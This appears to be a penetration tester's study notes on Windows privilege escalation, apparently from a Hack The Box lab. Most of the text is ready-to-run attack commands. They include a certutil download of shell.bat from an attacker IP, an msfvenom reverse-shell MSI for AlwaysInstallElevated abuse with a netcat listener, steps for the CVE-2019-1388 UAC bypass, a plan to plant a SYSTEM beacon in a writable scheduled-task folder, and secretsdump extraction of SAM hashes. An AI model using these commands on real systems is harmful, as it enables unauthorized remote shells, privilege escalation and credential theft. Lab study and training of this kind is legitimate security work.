LOLBAS: https://lolbas-project.github.io/
- Code execution
- Code compilation
- File transfers
- Persistence
- UAC bypass
- Credential theft
- Dumping process memory
- Keylogging
- Evasion
- DLL hijacking

**Transferring File with Certutil
```ps
certutil.exe -urlcache -split -f http://10.10.14.3:8080/shell.bat shell.bat
```

**Ecoding a File with Certutil
```
certutil -encode file1 encodedfile
```

**Decoding File with Certutil
```
certutil -decode encodedfile file2
```

**Run DLL
https://lolbas-project.github.io/lolbas/Binaries/Rundll32/


## Always Install Elevated
- Computer Configuration\Administrative Templates\Windows Components\Windows Installer
- User Configuration\Administrative Templates\Windows Components\Windows Installer

**Enumerating Always Install Elevated Settings
```ps
reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
```

**Generating MSI Package
```
msfvenom -p windows/shell_reverse_tcp lhost=10.10.14.3 lport=9443 -f msi > aie.msi
```

**Executing MSI Package
```
msiexec /i c:\users\htb-student\desktop\aie.msi /quiet /qn /norestart
```

**Catching Shell
```
nc -lvnp 9443
```

## CVE-2019-1388

1. Right-click on hhupd.exe and Run as administrator
2. Click on Show information about the publisher's certificate. If SpcSpAgencyInfo is located in the Details tab, it is vulnerable.
3. In the General tab, the Issued by is a hyperlink. Click on it and then click OK.
4. We are now running the browser as NT Authority/SYSTEM. Time to break out of the browser.
5. Right-click and choose View page source. Right-click and select Save as.
6. Type c:\windows\system32\cmd.exe in the file path and hit enter.

## Scheduled Tasks

**Enumerating Scheduled Tasks
https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/schtasks
```
schtasks /query /fo LIST /v
```

**Enumerating Scheduled Tasks with PowerShell
https://docs.microsoft.com/en-us/powershell/module/scheduledtasks/get-scheduledtask?view=windowsserver2019-ps
```
Get-ScheduledTask | select TaskName,State
```

**Checking Permissions on C:\Scripts Directory
```
.\accesschk64.exe /accepteula -s -d C:\Scripts\
```
- Has backups and is writeable, so let's create a beacon that calls back to our attack host. It runs as SYSTEM.


## User/Computer Description Field

**Checking Local User Description Field
```
Get-LocalUser
```

**Enumerating Computer Description Field with Get-WmiObject Cmdlet
```
Get-WmiObject -Class Win32_OperatingSystem | select Description
```


## Mount VHDX/VMDK

.vhd = Virtual Hard Disk (Hyper-V)
.vhdx = virtual hard disk v2 (Hyper-V)
.vmdk = virtual machine disk (VMware)

**Mount VMDK on Linux
```
guestmount -a SQL01-disk1.vmdk -i --ro /mnt/vmdk
```

**Mount VHD/VHDX on Linux
```
guestmount --add WEBSRV10.vhdx  --ro /mnt/vhdx/ -m /dev/sda1
```

On Windows:
- Right-click and choose Mount
- Use Disk Management utility
- Use Mount-VHD PowerShell cmdlet

**Retrieving Hashes using Secretsdump.py
SAM, SECURITY, and SYSTEM are located in C:\Windows\System32\Config
```
secretsdump.py -sam SAM -security SECURITY -system SYSTEM LOCAL
```
